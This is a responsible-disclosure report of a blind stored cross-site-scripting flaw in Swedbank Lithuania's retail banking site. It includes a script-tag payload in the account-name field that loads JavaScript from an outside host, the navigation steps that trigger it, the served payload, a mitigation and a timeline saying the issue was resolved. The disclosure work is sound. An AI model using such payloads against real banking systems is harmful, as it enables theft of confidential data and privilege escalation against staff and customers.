Blind Stored Cross-Site-Scripting (XSS) in Swedbank Retail Banking
==================================================================

Description
-----------
Regular authenticated internet banking users can include arbitrary input within bank’s account name. 
This makes internet banking application hosted at https://www.swedbank.lt/private vulnerable to a blind Stored Cross-Site-Scripting attack (XSS). 

A malicious actor would first place arbitrary javascript payload within their bank account name. 
Once it is accessed by another party - for example banking personnel, call centre staff etc. attacker-controlled javascript code would be executed within the context of the victim browser.
This could then be used to both leak confidential information and perform escalation of privillege attacks.

Proof-of-Concept
----------------

Authenticate to the web application and open the bank’s account setting page at:
https://www.swedbank.lt/private/home/important/aliases

Include following javascript code within your bank account name and save changes:
```
A<script src=“//p0wn.eu”></script>
```

*Note* To make an isolated check from external network a simple trick can be used:
Point domain used within payload to the IP address you control and save the entry within system’s `hosts` file. Then host any JS payload on the HTTPS web server.

Next a user (a victim) must visit the following page from the main menu:
```
1. Privatiems ▸
2. Kasdienės paslaugos ▸
3. Apžvalga
```

(English)
```
1. Private ▸
2. Everyday banking ▸
3. My finances
```
Reference url: 
https://www.swedbank.lt/private/d2d/accounts/overview

Or in mobile application goto
```
1. Paslaugos ▸
2. Kitos paslaugos ▸
3. Mano finansų apžvalga
```

(English)
```
1. Services ▸
2. Other services ▸ 
3. Summary of my finances
```

Then the payload is executed (pictures included).
Desktop (browser):
![Stored XSS attack](https://i.imgur.com/QRLirjN.png)

Mobile:
![Stored XSS attack on mobile app](https://i.imgur.com/4bezvvo.jpeg)

Unfiltered user input and failure to sanitize output in the web content leads to high security incidents since an attacker can invoke and launch various JS scripts or JS frameworks like BeEF (The Browser Exploitation Framework https://beefproject.com/) in the context of a user or other system’s users (banking personnel, call center staff etc.) browser.

Payload of the server's `p0wn.eu` content:
```
HTTP/1.1 200 OK
Server: Apache
Accept-Ranges: bytes
Content-Length: 23
Connection: close
Content-Type: application/javascript

alert(document.domain);
```
Mitigation
----------
Do a proper HTML Sanitisation for user input and page rendering afterwards.

Reference
---------
https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html


TIMELINE
--------
```
2023-10-15 DISCOVERED VULNERABILITY
2023-10-16 A REPORT CREATED AND SENT TO responsible-disclosure@swedbank.com
2023-10-16 AUTOREPLY RECIEVED
2023-12-14 CONTACTED OVER LinkedIn (Head of Offensive Cyber Security at Swedbank)
2023-12-14 REPLY RECEIVED
2023-12-14 RECEIVED CONFIRMATION THAT ISSUE WAS RESOLVED
2024-01-01 PUBLIC RELEASE
```
